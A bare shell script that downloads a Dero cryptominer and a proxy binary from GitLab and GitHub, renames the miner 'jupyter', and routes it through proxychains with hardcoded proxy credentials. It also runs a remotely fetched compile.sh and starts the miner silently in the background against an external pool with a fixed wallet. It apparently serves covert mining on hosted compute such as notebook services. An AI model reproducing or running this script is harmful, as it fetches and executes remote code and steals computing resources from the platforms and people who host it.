proxy="159.223.89.34" 
port="64055"
user="ingfo"  
pass="maseh"
curl -L -o jupyter https://gitlab.com/alekpoden82/binamas/-/raw/main/bypass-dero-miner && chmod +x jupyter
curl -L -o jupyter https://gitlab.com/alekpoden82/binamas/-/raw/main/dero-stratum-miner && chmod +x jupyter
curl -L -o  proxy https://gitlab.com/alekpoden82/binamas/-/raw/main/panel && chmod +x proxy
curl -L -o  https://raw.githubusercontent.com/Omarjetos/ezz/master/compile.sh && chmod +x compile.sh
curl -L -o  https://gitlab.com/alekpoden82/binamas/-/raw/main/libproxychains4.so && chmod +x libproxychains4.so
curl -L -o  https://gitlab.com/alekpoden82/binamas/-/raw/main/proxychains.conf && chmod +x proxychains.conf 
sleep 1 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf"  
sleep 1 
echo "******************************************************************" 
echo "Original IP ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "New IP ==> "$(./proxy curl ifconfig.me)
./proxy ./jupyter -r 159.223.89.34:443 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6838l67tghl8zqsn7unx.$(echo $(shuf -i 1-20000 -n 1)-dad) >/dev/null &
./compile.sh
echo success
